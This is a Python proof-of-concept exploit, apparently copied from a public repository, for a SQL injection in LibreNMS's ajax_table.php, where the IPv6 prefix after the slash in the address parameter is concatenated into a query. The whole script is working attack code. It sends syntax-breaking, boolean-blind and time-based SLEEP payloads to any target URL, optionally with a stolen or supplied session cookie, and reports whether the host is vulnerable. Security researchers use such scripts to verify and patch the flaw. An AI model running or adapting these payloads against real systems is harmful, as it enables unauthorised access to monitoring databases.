#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Reference PoC from: https://github.com/mbanyamer/CVE-2026-26988-LibreNMS-SQLi
# Exploit ID: 116383 | Classification: working_poc | Reliability: reliable
# Original Author: Mohammed Idrees Banyamer
#
# This is a REFERENCE copy of the public exploit for comparison.
#
# Targets: LibreNMS <= 25.12.0 ajax_table.php IPv6 prefix SQL Injection
# Endpoint: POST /ajax_table.php
# Parameters: id=address-search, search_type=ipv6, address=<addr>/<sqli_in_prefix>
#
# Attack: The prefix portion after "/" in the address parameter is directly
# concatenated into SQL: AND ipv6_prefixlen = '$prefix'
# Injecting a single quote breaks out of the string literal.
# ──────────────────────────────────────────────────────────────────────

import sys
import requests
import argparse
import time

def send_request(url, payload, cookies=None):
    start = time.time()
    data = {
        "id": "address-search",
        "search_type": "ipv6",
        "address": f"2001:db8::1/{payload}",
        "current": "1",
        "rowCount": "10",
    }
    try:
        r = requests.post(url, data=data, timeout=15, cookies=cookies)
        elapsed = time.time() - start
        return (r.status_code, r.text[:400], elapsed)
    except requests.RequestException as e:
        return (False, f"Request failed: {e}", 0.0)

def main():
    parser = argparse.ArgumentParser(description="PoC for CVE-2026-26988 (LibreNMS SQLi)")
    parser.add_argument("target", help="Base URL of LibreNMS (e.g. http://localhost:8080)")
    parser.add_argument("--cookie", type=str, default=None, help="Session cookie (e.g. 'librenms_session=abc123')")
    parser.add_argument("--test", action="store_true", help="Basic injection test (causes syntax error)")
    parser.add_argument("--boolean", action="store_true", help="Boolean-based blind test")
    parser.add_argument("--time", action="store_true", help="Time-based blind test (SLEEP)")
    parser.add_argument("--payload", type=str, default=None, help="Custom payload after /")
    args = parser.parse_args()

    base_url = args.target.rstrip("/") + "/ajax_table.php"
    cookies = {}
    if args.cookie:
        for c in args.cookie.split(";"):
            k, v = c.strip().split("=", 1)
            cookies[k] = v

    print(f"[*] Targeting: {base_url}")
    print("[*] Vulnerable param: address prefix (after /) in search_type=ipv6\n")

    # Baseline
    print("[>] Baseline request (no injection)...")
    code, text, elapsed = send_request(base_url, "64", cookies)
    print(f"    Status: {code} | Time: {elapsed:.2f}s\n")

    if args.test or not (args.boolean or args.time):
        payload = args.payload or "64'-- "
        print(f"[>] Syntax error test: address=2001:db8::1/{payload}")
        code, text, elapsed = send_request(base_url, payload, cookies)
        print(f"    Status: {code} | Time: {elapsed:.2f}s")
        if "error" in text.lower() or "sql" in text.lower() or code in (500, 400):
            print("[!] SQL error detected - likely VULNERABLE\n")

    if args.boolean:
        print("[>] Boolean-based blind test")
        _, text_true, _ = send_request(base_url, "64' OR 1=1 -- ", cookies)
        _, text_false, _ = send_request(base_url, "64' OR 1=2 -- ", cookies)
        print(f"    True  response length: {len(text_true)}")
        print(f"    False response length: {len(text_false)}")
        if len(text_true) != len(text_false):
            print("[!] Different responses - likely VULNERABLE\n")

    if args.time:
        print("[>] Time-based blind test (SLEEP 5s)")
        payload = args.payload or "64' OR SLEEP(5) -- "
        print(f"    Payload: address=2001:db8::1/{payload}")
        _, _, elapsed = send_request(base_url, payload, cookies)
        print(f"    Response time: {elapsed:.2f}s")
        if elapsed > 4.5:
            print("[!] Delay confirmed - VULNERABLE!\n")
        else:
            print("[ ] No delay - may be patched or WAF blocked\n")

if __name__ == "__main__":
    main()
